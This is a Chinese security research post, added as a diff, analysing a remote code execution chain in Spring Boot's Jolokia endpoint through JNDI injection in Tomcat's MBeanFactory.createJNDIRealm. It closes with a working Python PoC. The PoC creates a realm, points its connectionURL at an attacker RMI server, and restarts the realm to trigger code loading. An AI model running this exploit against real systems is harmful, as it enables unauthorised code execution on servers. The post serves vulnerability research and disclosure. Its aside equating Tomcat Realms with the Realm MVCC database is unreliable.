@@ -1,0 +1,91 @@
+**作者：Lucifaer  
+博客： **
+本文接[上文](https://paper.seebug.org/850/)，这里不会分析原文章中所说的`/env`这种利用的方法，而是说一下rr大佬的发现的另外一条利用链。
+### 0x01 检查MBean
+如果说不存在`ch.qos.logback.classic
+reloadByURL`这个MBean，还能不能造成RCE呢，这个是我在看完文章后的一个想法。如果说想要解决这个问题，我们需要再看看`/jolokia/list`中还有哪些利用链可用（真的是太多了T
+T，由于当时看完记得是在Spring Boot中内嵌的Tomcat中，所以直接看的这个类，然而这个类差点也看跪了T T）。
+最终找到`org.apache.catalina.mbeans.MBeanFactory`这个可能能造成JNDI注入的类，其中有以下这么几个方法从注释的描述中感觉是可以造成JNDI注入的：
+  * createUserDatabaseRealm
+  * createDataSourceRealm
+  * createJNDIRealm
+这几点中只有最后的`createJNDIRealm`是可用的，但是他们前面的处理流程都是一样的，接下来就将他们前面的处理流程简单的分析一下，并说明为什么只有`createJNDIRealm`是可用的。
+### 0x02 Realm创建流程分析
+Realm是一个MVCC数据库，而MVCC是用于解决多版本并发问题的一个方法。有关Realm的一些具体介绍可以参考[这篇文章](https://infoq.cn/article/introduce-and-common-problems-of-java-realm-principle)。而我自己的理解是就是它给每一个连接的线程建立了一个“快照”，当两个请求同时到达一个线程时，程序不会造成阻塞，而是会在这个“快照”（也是一个线程）中进行操作，当执行完成后，阻塞合并更改（有点像git）：
+然而Realm的原理跟我们主要要说的关系不大，tomcat在创建不同的Realm时其实大致的流程都是相同的，只是最后的具体实现不同而已，比如上一节中说道的三个Realm的创建在代码实现流程上是极为相似的：
+所以我们跟一下红框的部分然后看具体实现就好。
+不难看出关键点在于`container.setRealm(realm);`，跟进看一下：
+如果不存在则创建一个新的realm，这里涉及到`Lifecycle`的一部分设计与实现，如果想要了解`Lifecycle`的细节的话，可以参考[这篇文章](https://uule.iteye.com/blog/2340873)。跟进看一下：
+看一下这个`startInternal`的具体实现，发现是一个虚类，那么看一下它的继承关系，找一下它的具体实现：
+可以看到我们所找到这三个Realm的具体实现点了。
+下面说一下为什么`createUserDatabaseRealm`和`createDataSourceRealm`不能用。
+  1. `createUserDatabaseRealm`
+乍一看`resourceName`可控，好像可以JNDI注入，然后发现`getGlobalNamingContext()`返回的是一个null：
+所以无法利用。
+  2. `createDataSourceRealm`
+好像并不可以利用。
+### 0x03 createJNDIRealm的利用分析
+那么再来看看`createJNDIRealm`：
+这里有两个重要的点，`createDirContext()`用env来创建一个`InitialDirContext`，另一个点是`Context.*`的配置我们可以控。
+那么具体的JNDI触发点在哪里呢？我们需要着重跟一下`createDirContext`。
+首先`createDirContext`最后返回一个`InitialDirContext`对象，而这个对象是根据env来生成的：
+跟进，发现这个`InitialDirContext`实际上是`InitialContext`的子类，为什么要着重强调这一点呢？因为JDNI的两个必备要素中就一个要求是：上下文对象是通过InitialContext及其子类实例化的，且他们的lookup()方法允许动态协议切换。
+跟进看一下：
+`myProps`通过传入的初始上下文配置经过处理返回完整的上下文环境，可以把它看成env的“完整版”。接着向下跟进：
+注意红框部分，我们可以通过设置env中的`INITIAL_CONTEXT_FACTORY`来控制这里的`factory`，可以看一下有哪些是我们可以指定的：
+可以看到我们可以指定`com.sun.jndi.rmi.registry`，来进行rmi的操作，来看一下具体实现：
+这里的`var1`还是我们的env，也就是说这里的第一个参数是可控的：
+`var0`、`var1`可控，还调用了`lookup()`，在这里完成了JDNI的注入。
+### 0x04 构造poc
+梳理一下思路，我们需要做这么几部来完成攻击：
+  1. 创建`JNDIRealm`
+  2. 通过`getDirectoryContextEnvironment()`来设置`contextFactory`为`RegistryContextFactory`，并将`connectionURL`设置为自己的N/D服务器
+  3. 重启Realm来完成更改并执行（stop、start）
+也就是说需要发4次请求。
+在利用过程中get请求的构造比较麻烦这里用post请求来构造poc，关于post如何解析的可以参考get请求解析的分析流程，这里就不过多描述了。
+poc：
+    import requests as req
+    import sys
+    from pprint import pprint
+    url = sys.argv[1] + "/jolokia/"
+    pprint(url)
+    create_JNDIrealm = {
+        "mbean": "Tomcat:type=MBeanFactory",
+        "type": "EXEC",
+        "operation": "createJNDIRealm",
+        "arguments": ["Tomcat:type=Engine"]
+    }
+    set_contextFactory = {
+        "mbean": "Tomcat:realmPath=/realm0,type=Realm",
+        "type": "WRITE",
+        "attribute": "contextFactory",
+        "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
+    }
+    set_connectionURL = {
+        "mbean": "Tomcat:realmPath=/realm0,type=Realm",
+        "type": "WRITE",
+        "attribute": "connectionURL",
+        "value": "rmi://localhost:1097/Exploit"
+    }
+    stop_JNDIrealm = {
+        "mbean": "Tomcat:realmPath=/realm0,type=Realm",
+        "type": "EXEC",
+        "operation": "stop",
+        "arguments": []
+    }
+    start = {
+        "mbean": "Tomcat:realmPath=/realm0,type=Realm",
+        "type": "EXEC",
+        "operation": "start",
+        "arguments": []
+    }
+    expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]
+    for i in expoloit:
+        rep = req.post(url, json=i)
+        pprint(rep.json())
+效果：
+### 0x05 Reference
+  * 
+  * 
+  * 
+* * *
